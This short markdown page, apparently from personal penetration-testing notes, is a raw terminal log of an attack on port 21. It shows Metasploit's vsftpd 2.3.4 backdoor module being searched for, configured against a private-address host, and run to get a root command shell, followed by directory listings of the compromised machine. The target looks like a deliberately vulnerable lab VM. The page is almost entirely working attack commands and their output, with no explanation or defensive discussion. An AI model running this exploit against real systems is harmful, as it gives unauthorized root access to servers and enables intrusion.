---
description: Using Metasploit attacking on Port 21
---

# Attacking on Port 21

Once you're strong enough, save the world:

```


┌──(kali㉿kali)-[~]
└─$ msfconsole        
Metasploit tip: You can upgrade a shell to a Meterpreter session on many 
platforms using sessions -u <session_id>
                                                  
                          ########                  #
                      #################            #
                   ######################         #
                  #########################      #
                ############################
               ##############################
               ###############################
              ###############################
              ##############################
                              #    ########   #
                 ##        ###        ####   ##
                                      ###   ###
                                    ####   ###
               ####          ##########   ####
               #######################   ####
                 ####################   ####
                  ##################  ####
                    ############      ##
                       ########        ###
                      #########        #####
                    ############      ######
                   ########      #########
                     #####       ########
                       ###       #########
                      ######    ############
                     #######################
                     #   #   ###  #   #   ##
                     ########################
                      ##     ##   ##     ##
                            https://metasploit.com


       =[ metasploit v6.4.50-dev                          ]
+ -- --=[ 2496 exploits - 1283 auxiliary - 431 post       ]
+ -- --=[ 1610 payloads - 49 encoders - 13 nops           ]
+ -- --=[ 9 evasion                                       ]

Metasploit Documentation: https://docs.metasploit.com/

msf6 > search vsftpd 2.3.4

Matching Modules
================

   #  Name                                  Disclosure Date  Rank       Check  Description
   -  ----                                  ---------------  ----       -----  -----------
   0  exploit/unix/ftp/vsftpd_234_backdoor  2011-07-03       excellent  No     VSFTPD v2.3.4 Backdoor Command Execution


Interact with a module by name or index. For example info 0, use 0 or use exploit/unix/ftp/vsftpd_234_backdoor

msf6 > use 0
[*] No payload configured, defaulting to cmd/unix/interact
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > show options

Module options (exploit/unix/ftp/vsftpd_234_backdoor):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   CHOST                     no        The local client address
   CPORT                     no        The local client port
   Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                    yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT    21               yes       The target port (TCP)


Exploit target:

   Id  Name
   --  ----
   0   Automatic



View the full module info with the info, or info -d command.

msf6 exploit(unix/ftp/vsftpd_234_backdoor) > set RHOST 192.168.146.132
RHOST => 192.168.146.132
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > exploit
[*] 192.168.146.132:21 - Banner: 220 (vsFTPd 2.3.4)
[*] 192.168.146.132:21 - USER: 331 Please specify the password.
[+] 192.168.146.132:21 - Backdoor service has been spawned, handling...
[+] 192.168.146.132:21 - UID: uid=0(root) gid=0(root)
ls
[*] Found shell.
[*] Command shell session 1 opened (192.168.146.130:36011 -> 192.168.146.132:6200) at 2025-04-10 15:21:10 -0400

bin
boot
cdrom
dev
etc
home
initrd
initrd.img
lib
lost+found
media
mnt
nohup.out
opt
proc
root
sbin
srv
sys
tmp
usr
var
vmlinuz
pwd
/
cd var
ls -la  
total 48
drwxr-xr-x 14 root     root     4096 Mar 17  2010 .
drwxr-xr-x 21 root     root     4096 May 20  2012 ..
drwxr-xr-x  2 root     root     4096 May  8  2010 backups
drwxr-xr-x 12 root     root     4096 Apr 28  2010 cache
drwxr-xr-x 37 root     root     4096 May 20  2012 lib
drwxrwsr-x  2 root     staff    4096 Apr 15  2008 local
drwxrwxrwt  3 root     root       60 Apr 10 15:12 lock
drwxr-xr-x 14 root     root     4096 Apr 10 15:12 log
drwxrwsr-x  2 root     mail     4096 May  7  2010 mail
drwxr-xr-x  2 root     root     4096 Mar 16  2010 opt
drwxr-xr-x 14 root     root      600 Apr 10 15:12 run
drwxr-xr-x  5 root     root     4096 Apr 28  2010 spool
drwxrwxrwt  2 root     root     4096 May 20  2012 tmp
drwxr-xr-x 10 www-data www-data 4096 May 20  2012 www
cd www   
ls
dav
dvwa
index.php
mutillidae
phpMyAdmin
phpinfo.php
test
tikiwiki
tikiwiki-old
twiki
ls -la  
total 80
drwxr-xr-x 10 www-data www-data  4096 May 20  2012 .
drwxr-xr-x 14 root     root      4096 Mar 17  2010 ..
drwxrwxrwt  2 root     root      4096 May 20  2012 dav
drwxr-xr-x  8 www-data www-data  4096 May 20  2012 dvwa
-rw-r--r--  1 www-data www-data   891 May 20  2012 index.php
drwxr-xr-x 10 www-data www-data  4096 May 14  2012 mutillidae
drwxr-xr-x 11 www-data www-data  4096 May 14  2012 phpMyAdmin
-rw-r--r--  1 www-data www-data    19 Apr 16  2010 phpinfo.php
drwxr-xr-x  3 www-data www-data  4096 May 14  2012 test
drwxrwxr-x 22 www-data www-data 20480 Apr 19  2010 tikiwiki
drwxrwxr-x 22 www-data www-data 20480 Apr 16  2010 tikiwiki-old
drwxr-xr-x  7 www-data www-data  4096 Apr 16  2010 twiki




```



